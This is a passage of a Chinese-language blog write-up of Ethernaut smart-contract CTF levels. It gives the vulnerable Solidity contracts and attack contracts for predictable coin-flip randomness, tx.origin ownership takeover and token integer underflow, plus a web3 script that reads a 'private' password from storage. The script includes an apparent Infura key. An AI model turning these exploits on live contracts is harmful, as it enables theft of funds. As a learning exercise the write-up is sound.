src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281242061.png\"></p>\n<p><strong>以太坊每14秒产生一个区块，所以block.number是当前的区块，在这个时间段的交易会被打包进这个区块所以我们可以计算题目中的blockvalue</strong></p>\n<p>因为有if (lastHash &#x3D;&#x3D; blockValue)的限制，所以连续多次调用可能会失败</p>\n<h2 id=\"Attack-2\"><a href=\"#Attack-2\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">CoinFlip</span> <span class=\"token punctuation\">&#123;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> _guess<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n \n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span> <span class=\"token punctuation\">&#123;</span>\n    CoinFlip <span class=\"token keyword\">constant</span> <span class=\"token keyword\">private</span> target <span class=\"token operator\">=</span> <span class=\"token function\">CoinFlip</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x8732271d55EA7cb0B28492932fabE9cE2eD06F83</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">pwn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n          <span class=\"token builtin\">uint256</span> FACTOR <span class=\"token operator\">=</span> <span class=\"token number\">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class=\"token punctuation\">;</span>\n          <span class=\"token builtin\">uint256</span> blockValue<span class=\"token operator\">=</span><span class=\"token builtin\">uint</span> <span class=\"token punctuation\">(</span><span class=\"token function\">blockhash</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>number<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n          <span class=\"token builtin\">uint256</span> coinFlip <span class=\"token operator\">=</span> blockValue<span class=\"token operator\">/</span>FACTOR<span class=\"token punctuation\">;</span>\n          <span class=\"token builtin\">bool</span> side <span class=\"token operator\">=</span> coinFlip <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token operator\">?</span> <span class=\"token boolean\">true</span> <span class=\"token punctuation\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n          target<span class=\"token punctuation\">.</span><span class=\"token function\">flip</span><span class=\"token punctuation\">(</span>side<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281243358.png\"></p>\n<h1 id=\"4-Telephone\"><a href=\"#4-Telephone\" class=\"headerlink\" title=\"4.Telephone\"></a>4.Telephone</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：将owner变成自己</p></blockquote>\n<h2 id=\"Code-3\"><a href=\"#Code-3\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Telephone</span> <span class=\"token punctuation\">&#123;</span>\n\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">changeOwner</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _owner<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tx<span class=\"token punctuation\">.</span>origin <span class=\"token operator\">!=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      owner <span class=\"token operator\">=</span> _owner<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyze-3\"><a href=\"#Analyze-3\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h2><p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281243530.png\"></p>\n<p>没什么难点主要就是区分msg.sender和tx.origin的区别。在一个简单的调用链A&gt;B&gt;C&gt;D中如果D内的全局变量为msg.sender它将指向最近一笔的交易地址，也就是C；如果D内的全局变量是tx.orgin，它就会指向最初发送交易的地址，也就是A</p>\n<h2 id=\"Attack-3\"><a href=\"#Attack-3\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">Attack</span> <span class=\"token punctuation\">&#123;</span>\n    Telephone <span class=\"token keyword\">constant</span> <span class=\"token keyword\">private</span> target <span class=\"token operator\">=</span> <span class=\"token function\">Telephone</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x6F28D4210D178F6B37bFBe8D1dD8b08402EaC12a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">hack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">changeOwner</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"5-Token\"><a href=\"#5-Token\" class=\"headerlink\" title=\"5.Token\"></a>5.Token</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：这一关的目标是攻破下面这个基础 token 合约，你最开始有20个 token, 如果你通过某种方法可以增加你手中的 token 数量,你就可以通过这一关,当然越多越好</p></blockquote>\n<h2 id=\"Code-4\"><a href=\"#Code-4\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Token</span> <span class=\"token punctuation\">&#123;</span>\n\n  <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> balances<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> totalSupply<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _initialSupply<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> totalSupply <span class=\"token operator\">=</span> _initialSupply<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> _value<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> _value <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> _value<span class=\"token punctuation\">;</span>\n    balances<span class=\"token punctuation\">[</span>_to<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> _value<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _owner<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> balance<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> balances<span class=\"token punctuation\">[</span>_owner<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span><span class=\"token punctuation\">&#123;</span>\n    Token <span class=\"token keyword\">constant</span> <span class=\"token keyword\">private</span> target <span class=\"token operator\">=</span> <span class=\"token function\">Token</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x54101E29C84002f75B5c2378e43A56D6174460A8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">hack</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span><span class=\"token builtin\">uint</span> value<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>to<span class=\"token punctuation\">,</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyze-4\"><a href=\"#Analyze-4\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h2><p>整数溢出漏洞，transfer函数的value可控，构造下溢即可</p>\n<h2 id=\"Attack-4\"><a href=\"#Attack-4\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">pragma solidity ^0.6.0;\n\ncontract Token &#123;\n\n  mapping(address &#x3D;&gt; uint) balances;\n  uint public totalSupply;\n\n  constructor(uint _initialSupply) public &#123;\n    balances[msg.sender] &#x3D; totalSupply &#x3D; _initialSupply;\n  &#125;\n\n  function transfer(address _to, uint _value) public returns (bool) &#123;\n    require(balances[msg.sender] - _value &gt;&#x3D; 0);\n    balances[msg.sender] -&#x3D; _value;\n    balances[_to] +&#x3D; _value;\n    return true;\n  &#125;\n\n  function balanceOf(address _owner) public view returns (uint balance) &#123;\n    return balances[_owner];\n  &#125;\n&#125;\ncontract attack&#123;\n    Token constant private target &#x3D; Token(0x54101E29C84002f75B5c2378e43A56D6174460A8);\n    function hack(address to,uint value) public &#123;\n        target.transfer(to,value);\n    &#125;\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h1 id=\"6-Vault\"><a href=\"#6-Vault\" class=\"headerlink\" title=\"6.Vault\"></a>6.Vault</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：打开 vault 来通过这一关!</p></blockquote>\n<h2 id=\"Code-5\"><a href=\"#Code-5\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Vault</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token builtin\">bool</span> <span class=\"token keyword\">public</span> locked<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">bytes32</span> <span class=\"token keyword\">private</span> password<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span> _password<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    locked <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    password <span class=\"token operator\">=</span> _password<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">unlock</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span> _password<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>password <span class=\"token operator\">==</span> _password<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      locked <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyze-5\"><a href=\"#Analyze-5\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h2><p>事先了解变量存储机制，得知password存储在slot1（bool占据slot0）</p>\n<h2 id=\"Attack-5\"><a href=\"#Attack-5\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">pragma solidity ^0.6.0;\n\ncontract Vault &#123;\n  bool public locked;\n  bytes32 private password;\n\n  constructor(bytes32 _password) public &#123;\n    locked &#x3D; true;\n    password &#x3D; _password;\n  &#125;\n\n  function unlock(bytes32 _password) public &#123;\n    if (password &#x3D;&#x3D; _password) &#123;\n      locked &#x3D; false;\n    &#125;\n  &#125;\n&#125;\ncontract attack&#123;\n    Vault constant private target&#x3D;Vault(0xB873A0f46Db8182Bdb4EAd9f95742EaeaBB5295C);\n    function unlock(bytes32 _password) public &#123;\n        target.unlock(_password);\n    &#125;\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> web3 <span class=\"token keyword\">import</span> Web3<span class=\"token punctuation\">,</span>HTTPProvider\n<span class=\"token keyword\">import</span> json\nhttp <span class=\"token operator\">=</span> <span class=\"token string\">'https://rinkeby.infura.io/v3/538e5cfe4f9a402cbc81eeb8205254ab'</span>\nweb3 <span class=\"token operator\">=</span> Web3<span class=\"token punctuation\">(</span>HTTPProvider<span class=\"token punctuation\">(</span>http<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\ntrade_hash <span class=\"token operator\">=</span> <span class=\"token string\">'0x119ce1ec582b1672346a2e40ad31bac13a104e047bb2b5ce53c7f46918bddc51'</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>web3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>getTransaction<span class=\"token punctuation\">(</span>trade_hash<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>web3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>getTransactionReceipt<span class=\"token punctuation\">(</span>trade_hash<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>web3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>getStorageAt<span class=\"token punctuation\">(</span><span class=\"token string\">\"0xB873A0f46Db8182Bdb4EAd9f95742EaeaBB5295C\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">//</span>获得存储在slot1下的_password，结果为：A very strong secret password <span class=\"token punctuation\">:</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>binascii<span class=\"token punctuation\">.</span>b2a_hex<span class=\"token punctuation\">(</span>web3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>getStorageAt<span class=\"token punctuation\">(</span><span class=\"token string\">\"0xB873A0f46Db8182Bdb4EAd9f95742EaeaBB5295C\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">//</span>获得存储在slot1下的_password并转为<span class=\"token number\">16</span>进制，结果为：<span class=\"token punctuation\">(</span>0x<span class=\"token punctuation\">)</span>412076657279207374726f6e67207365637265742070617373776f7264203a29，注意在开头添加0x\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281243182.png\"></p>\n<p>接下来部署攻击合约并传入相应结果，通过本关</p>\n<h1 id=\"7-Delegation\"><a href=\"#7-Delegation\" class=\"headerlink\" title=\"7.Delegation\"></a>7.Delegation</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：这一关的目标是申明你对你创建实例的所有权.</p>\n<p> 这可能有帮助</p>\n<ul>\n<li>仔细看solidity文档关于 <code>delegatecall</code> 的低级函数, 他怎么运行的, 他如何将操作委托给链上库, 以及他对执行的影响.</li>\n<li>Fallback 方法</li>\n<li>方法 ID</li>\n</ul></blockquote>\n<h2 id=\"Code-6\"><a href=\"#Code-6\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token 